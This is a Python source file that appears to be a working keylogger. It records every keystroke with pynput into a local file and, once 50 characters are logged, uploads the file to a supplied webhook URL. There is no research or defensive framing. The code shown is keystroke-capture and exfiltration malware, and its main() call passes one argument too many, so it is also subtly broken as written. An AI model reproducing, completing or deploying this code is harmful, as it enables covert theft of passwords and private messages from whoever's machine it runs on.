from pynput import keyboard
import os
import requests

class KeyboardLogger:
    def __init__(self, output_file, webhook_url):
        self.output_file = output_file
        self.caps_lock_active = False
        self.total_keys = 0
        self.webhook_url = webhook_url
        self.running = True
    def format_key(self, key):
        if isinstance(key, keyboard.KeyCode):
            return key.char if key.char else str(key.vk)
        else:
            return str(key)
    def on_key_press(self, key):
        try:
            with open(self.output_file, 'a', encoding='utf-8', errors="ignore") as f:
                if key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.enter:
                    f.write('\n')
                elif key == keyboard.Key.caps_lock:
                    self.caps_lock_active = not self.caps_lock_active
                    if self.caps_lock_active:
                        f.write('[caps_lock_on]')
                    else:
                        f.write('[caps_lock_off]')
                elif key == keyboard.Key.f1:
                    f.write('[F1]')
                elif key == keyboard.Key.f2:
                    f.write('[F2]')
                elif key == keyboard.Key.f3:
                    f.write('[F3]')
                elif key == keyboard.Key.f4:
                    f.write('[F4]')
                elif key == keyboard.Key.f5:
                    f.write('[F5]')
                elif key == keyboard.Key.f6:
                    f.write('[F6]')
                elif key == keyboard.Key.f7:
                    f.write('[F7]')
                elif key == keyboard.Key.f8:
                    f.write('[F8]')
                elif key == keyboard.Key.f9:
                    f.write('[F9]')
                elif key == keyboard.Key.f10:
                    f.write('[F10]')
                elif key == keyboard.Key.f11:
                    f.write('[F11]')
                elif key == keyboard.Key.f12:
                    f.write('[F12]')
                elif key == keyboard.Key.home:
                    f.write('[Home]')
                elif key == keyboard.Key.end:
                    f.write('[End]')
                elif key == keyboard.Key.page_up:
                    f.write('[PageUp]')
                elif key == keyboard.Key.page_down:
                    f.write('[PageDown]')
                elif key == keyboard.Key.up:
                    f.write(str('↑'))
                elif key == keyboard.Key.down:
                    f.write(str('↓'))
                elif key == keyboard.Key.right:
                    f.write(str('→'))
                elif key == keyboard.Key.left:
                    f.write(str('←'))
                elif key == keyboard.Key.backspace:
                    f.write("[back_space]")
                elif key == keyboard.Key.esc:
                    f.write("esc ")
                else:
                    char = self.format_key(key).upper() if self.caps_lock_active else self.format_key(key).lower()
                    f.write(f'{char}')
                    self.total_keys += 1  
                    if self.total_keys >= 50:
                        self.send_webhook()
        except AttributeError:
            with open(self.output_file, 'a', encoding='utf-8', errors="ignore") as f:
                if key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.enter:
                    f.write('\n')
                elif key == keyboard.Key.caps_lock:
                    self.caps_lock_active = not self.caps_lock_active
                    if self.caps_lock_active:
                        f.write('[caps_lock_on]')
                    else:
                        f.write('[caps_lock_off]')
                elif key == keyboard.Key.f1:
                    f.write('[F1]')
                elif key == keyboard.Key.f2:
                    f.write('[F2]')
                elif key == keyboard.Key.f3:
                    f.write('[F3]')
                elif key == keyboard.Key.f4:
                    f.write('[F4]')
                elif key == keyboard.Key.f5:
                    f.write('[F5]')
                elif key == keyboard.Key.f6:
                    f.write('[F6]')
                elif key == keyboard.Key.f7:
                    f.write('[F7]')
                elif key == keyboard.Key.f8:
                    f.write('[F8]')
                elif key == keyboard.Key.f9:
                    f.write('[F9]')
                elif key == keyboard.Key.f10:
                    f.write('[F10]')
                elif key == keyboard.Key.f11:
                    f.write('[F11]')
                elif key == keyboard.Key.f12:
                    f.write('[F12]')
                elif key == keyboard.Key.home:
                    f.write('[Home]')
                elif key == keyboard.Key.end:
                    f.write('[End]')
                elif key == keyboard.Key.page_up:
                    f.write('[PageUp]')
                elif key == keyboard.Key.page_down:
                    f.write('[PageDown]')
                elif key == keyboard.Key.up:
                    f.write(str('↑'))
                elif key == keyboard.Key.down:
                    f.write(str('↓'))
                elif key == keyboard.Key.right:
                    f.write(str('→'))
                elif key == keyboard.Key.left:
                    f.write(str('←'))
                elif key == keyboard.Key.backspace:
                    f.write("[back_space]")
                elif key == keyboard.Key.esc:
                    f.write("esc ")
                else:
                    char = self.format_key(key).upper() if self.caps_lock_active else self.format_key(key).lower()
                    f.write(f'{char}')
                    
                    self.total_keys += 1  # Tuş sayısını artır

                    # Kontrol ve gönderme işlemi
                    if self.total_keys >= 50:
                        self.send_webhook()
    def send_webhook(self):
        print("sendings")
        if os.path.exists(self.output_file) and self.total_keys >= 50:
            with open(self.output_file, 'r', encoding="utf-8", errors="ignore") as file:
                payload = {
                    'file': (self.output_file, file)
                }
                response = requests.post(self.webhook_url, files=payload)
                if response.status_code == 200:
                    print("log send succesfully.")
                else:
                    print("log cant send.")
                self.total_keys = 0
    def start_logging(self):
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            listener.join()

def main(filexd, urlxd):
    output_file = filexd
    webhook_url = urlxd
    logger = KeyboardLogger(output_file, webhook_url, "appdata")
    logger.start_logging()
